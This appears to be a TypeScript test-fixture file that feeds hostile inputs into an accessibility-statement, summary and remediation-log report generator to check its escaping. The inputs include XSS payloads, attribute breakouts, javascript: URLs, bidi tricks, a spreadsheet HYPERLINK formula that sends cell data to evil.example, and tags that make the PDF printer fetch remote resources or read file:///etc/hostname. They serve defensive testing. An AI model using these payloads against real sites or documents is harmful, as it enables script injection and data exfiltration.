// Inputs that try every way into the reports: markup, script URLs, attribute breakouts,
// spreadsheet formulas, control and bidirectional characters, and requests to a server.
import type { RemediationLogInput, StatementInput, SummaryInput } from '../../src/index.ts';
import { remediationInput, statementInput, summaryInput } from '../fixtures.ts';

export const HOSTILE = {
  markup: '<img src=x onerror=alert(1)>',
  title: '</title><script>alert(1)</script>',
  attribute: '" onmouseover="alert(1)" x="',
  url: 'javascript:alert(1)',
  formula: '=HYPERLINK("https://evil.example/?d="&A1,"Open")',
  bidi: 'safe\u202Etxt.exe\u202C',
  control: 'bell\u0007null\u0000',
  svg: '<svg onload=alert(1)>',
} as const;

/** Hostile text that also tries to make the PDF printer fetch from `origin`. */
function fetching(origin: string): string {
  return `<img src="${origin}/escaped-img"><link rel="stylesheet" href="${origin}/escaped-css"><iframe src="file:///etc/hostname"></iframe>`;
}

export function hostileStatement(origin = 'http://127.0.0.1:9'): StatementInput {
  const all = Object.values(HOSTILE).join(' ');
  return statementInput({
    organization: `${HOSTILE.title} ${HOSTILE.bidi}`,
    site: {
      name: `${HOSTILE.markup} ${HOSTILE.attribute}`,
      url: 'https://example-goods.example/?q="><b>',
      platform: 'shopify',
    },
    findings: [
      {
        summary: `${all} ${fetching(origin)}`,
        criteria: ['1.1.1'],
        impact: 'critical',
        status: 'open',
        occurrences: 2,
      },
    ],
    measures: [all, fetching(origin)],
    limitations: [
      {
        description: all,
        reason: HOSTILE.markup,
        alternative: fetching(origin),
        plannedFixBy: new Date('2026-12-01T00:00:00Z'),
      },
    ],
    contact: {
      email: 'access@example-goods.example',
      postalAddress: `${HOSTILE.markup}\n${HOSTILE.control}`,
      responseTime: HOSTILE.attribute,
    },
    compatibility: fetching(origin),
    otherEvaluations: [{ description: all }],
    complaints: {
      description: `${HOSTILE.svg} ${fetching(origin)}`,
      url: 'https://consumer-authority.example/?x=<y>&z="w"',
    },
  });
}

export function hostileSummary(origin = 'http://127.0.0.1:9'): SummaryInput {
  return summaryInput({
    site: {
      name: `${HOSTILE.svg} ${HOSTILE.bidi} ${fetching(origin)}`,
      url: 'https://example-goods.example',
      platform: 'shopify',
    },
    coverage: {
      automated: [],
      partial: ['1.1.1'],
      rulesetVersion: `${HOSTILE.title} ${HOSTILE.attribute}`,
    },
  });
}

export function hostileRemediation(): RemediationLogInput {
  const base = remediationInput();
  const [entry] = base.entries;
  const finding = entry?.findings[0];
  if (entry === undefined || finding === undefined || entry.change.kind !== 'data') {
    throw new Error('fixture');
  }
  return remediationInput({
    site: { name: HOSTILE.formula, url: 'https://example-goods.example', platform: 'shopify' },
    entries: [
      {
        ...entry,
        approver: { kind: 'user', name: HOSTILE.formula },
        change: {
          ...entry.change,
          before: `${HOSTILE.formula}</script>`,
          after: `+${HOSTILE.markup}`,
        },
        findings: [{ ...finding, summary: `-${HOSTILE.bidi}`, ruleId: '@rule' }],
      },
    ],
  });
}
